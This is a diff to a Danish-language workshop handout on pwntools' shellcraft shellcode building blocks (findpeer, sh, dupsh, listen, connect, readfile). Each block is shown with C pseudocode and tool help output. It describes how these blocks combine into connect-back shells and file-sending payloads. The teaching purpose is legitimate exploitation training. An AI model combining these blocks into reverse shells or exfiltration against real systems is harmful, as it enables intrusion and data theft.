@@ -24,7 +24,6 @@ Byggeklodser really, plus et par færdigbyggede klar-til-brug.
 
 Shellcraft
 ----------
-
 'findpeer' er en ret fantastisk byggeklods.
 
 [source,bash]
@@ -33,6 +32,27 @@ $ shellcraft i386.linux.findpeer -?
 Args: port (defaults to any port)
     Finds a socket, which is connected to the specified port.
     Leaves socket in ESI.
+------------------------------------------------
+
+Den gør ca. dette:
+[source,c]
+------------------------------------------------
+struct sockaddr_in addr;
+socklen_t addrlen = sizeof(struct sockaddr_in);
+int socket = 0;
+while (getpeername(socket, &addr, &addrlen) < 0) {
+    socket++;
+}
+/* yay, a connected socket has been found */
+------------------------------------------------
+
+[source,bash]
+------------------------------------------------
+$ shellcraft -f a i386.linux.findpeer
+findpeer_1:
+    push -1
+    push SYS_socketcall_getpeername
+.....
 ------------------------------------------------
 
 Opgave 3
@@ -49,9 +69,141 @@ Skær alt unødvendigt væk fra opgave fire.
 
 Standard single stage shellcodes
 --------------------------------
-
 * sh (til lokale exploits)
-* bind (branch i386-bindshell tilføjer den)
-* connectback
+* dupsh (til remote exploits)
+* listen (branch i386-bindshell tilføjer den)
+* connect
 * findpeer
 * readfile
+
+Standard single stage shellcodes - sh
+-------------------------------------
+Eksekverer en shell. I sin rene form kan den kun bruges i lokale exploits.
+
+Gør ca. dette:
+[source,c]
+------------------------------------------------
+execve("/bin/sh", 0, 0);
+------------------------------------------------
+
+Standard single stage shellcodes - dupsh
+----------------------------------------
+Omdirrigerer standard in, standard out og standard error til en given file descriptor (socket?) og eksekverer en shell.
+
+[source,c]
+------------------------------------------------
+dup2(fd, 2);
+dup2(fd, 1);
+dup2(fd, 0);
+execve("/bin/sh", 0, 0);
+------------------------------------------------
+
+Giver mest mening efter enten 'listen', 'connect' eller 'findpeer'.
+
+TIP: 'findpeersh' er lig med 'findpeer + dupsh'
+
+Standard single stage shellcodes - listen
+-----------------------------------------
+Laver en server socket og accepterer første forbindelse på en given port.
+
+[source,c]
+------------------------------------------------
+struct sockaddr_in addr;
+int server, client;
+server = socket(AF_INET, SOCK_STREAM, 0);
+addr.sin_family = AF_INET;
+addr.sin_port = htons(port); //port argument required
+addr.sin_addr.s_addr = INADDR_ANY;
+bind(server, &addr, sizeof(struct sockaddr_in));
+listen(server, 1);
+client = accept(server);
+------------------------------------------------
+
+TIP: Er god sammen med 'readfile' eller 'dupsh'.
+
+TIP: Understøtter både IPv4 og IPv6!!!
+
+Standard single stage shellcodes - connect
+------------------------------------------
+Forbinder til en server på en given port. Specificeres et hostname bliver det resolved lokalt inden shellcoden genereres med hardcoded IP adresse.
+
+[source,c]
+------------------------------------------------
+struct sockaddr_in addr;
+int client;
+client = socket(AF_INET, SOCK_STREAM, 0);
+addr.sin_family = AF_INET;
+addr.sin_port = htons(port); //port argument required
+addr.sin_addr.s_addr = some_address; //address argument required
+connect(client, &addr, sizeof(struct sockaddr_in));
+------------------------------------------------
+
+TIP: Er god sammen med 'readfile' eller 'dupsh'.
+
+TIP: Understøtter både IPv4 og IPv6!!!
+
+Standard single stage shellcodes - findpeer
+-------------------------------------------
+Har vi snakket om, men her er den igen:
+
+[source,c]
+------------------------------------------------
+struct sockaddr_in addr;
+socklen_t addrlen = sizeof(struct sockaddr_in);
+int socket = 0;
+while (getpeername(socket, &addr, &addrlen) < 0) {
+    socket++;
+}
+------------------------------------------------
+
+TIP: Er god sammen med 'readfile' eller 'dupsh'.
+
+TIP: Understøtter både IPv4 og IPv6!!!
+
+Standard single stage shellcodes - readfile
+-------------------------------------------
+Åbner en fil og sender dens indhold til en given file descriptor (f.eks. en socket).
+
+[source,c]
+------------------------------------------------
+struct stat st;
+int file = open(path, O_RDONLY); //path argument required
+fstat(file, &st);
+sendfile(some_file_descriptor, file, 0, st.st_size);
+------------------------------------------------
+
+Standard single stage shellcodes - connect + dupsh
+--------------------------------------------------
+[source,bash]
+------------------------------------------------
+$ shellcraft i386.linux.connect -?
+Connects to the host on the specified port.
+Leaves the connected socket in ebp
+
+Arguments:
+    host(str): Remote IP address or hostname (as a dotted quad / string)
+    port(int): Remote port
+    network(str): Network protocol (ipv4 or ipv6)
+$ shellcraft i386.linux.dupsh -?                                           
+Args: [sock (imm/reg) = ebp]
+    Duplicates sock to stdin, stdout and stderr and spawns a shell.
+$
+------------------------------------------------
+
+Standard single stage shellcodes - connect + readfile
+-----------------------------------------------------
+[source,bash]
+------------------------------------------------
+$ shellcraft i386.linux.connect -?                                         
+Connects to the host on the specified port.
+Leaves the connected socket in ebp
+
+Arguments:
+    host(str): Remote IP address or hostname (as a dotted quad / string)
+    port(int): Remote port
+    network(str): Network protocol (ipv4 or ipv6)
+$ shellcraft i386.linux.readfile -?
+Args: [path, dst (imm/reg) = esi ]
+    Opens the specified file path and sends its content to the specified file descriptor.
+$
+------------------------------------------------
